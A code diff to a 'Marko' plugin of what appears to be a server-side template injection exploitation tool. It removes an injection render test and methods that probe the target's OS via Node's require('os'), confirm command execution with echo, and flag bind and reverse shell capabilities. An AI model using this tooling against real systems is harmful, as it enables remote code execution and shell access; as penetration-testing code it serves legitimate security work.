@@ -15,13 +15,6 @@ class Marko(javascript.Javascript):
                 'render': '${%(code)s}',
                 'header': '${"%(header)s"}',
                 'trailer': '${"%(trailer)s"}',
-                'render_test': '%(n1)s*%(n2)s' % { 
-                    'n1' : rand.randints[0], 
-                    'n2' : rand.randints[1]
-                },
-                'render_expected': '%(res)s' % { 
-                    'res' : rand.randints[0]*rand.randints[1] 
-                }
             },
             'write' : {
                 'call' : 'inject',
@@ -47,29 +40,3 @@ class Marko(javascript.Javascript):
             { 'level': 2, 'prefix': '1/>', 'suffix' : '' },
             
         ])
-
-    language = 'javascript'
-
-    def rendered_detected(self):
-
-        os = self.evaluate("""require('os').platform()""")
-        if os and re.search('^[\w-]+$', os):
-            self.set('os', os)
-            self.set('evaluate', self.language)
-            self.set('write', True)
-            self.set('read', True)
-
-            expected_rand = str(rand.randint_n(2))
-            if expected_rand == self.execute('echo %s' % expected_rand):
-                self.set('execute', True)
-                self.set('bind_shell', True)
-                self.set('reverse_shell', True)
-
-
-    def blind_detected(self):
-
-        if self.execute_blind('echo %s' % str(rand.randint_n(2))):
-            self.set('execute_blind', True)
-            self.set('write', True)
-            self.set('bind_shell', True)
-            self.set('reverse_shell', True)
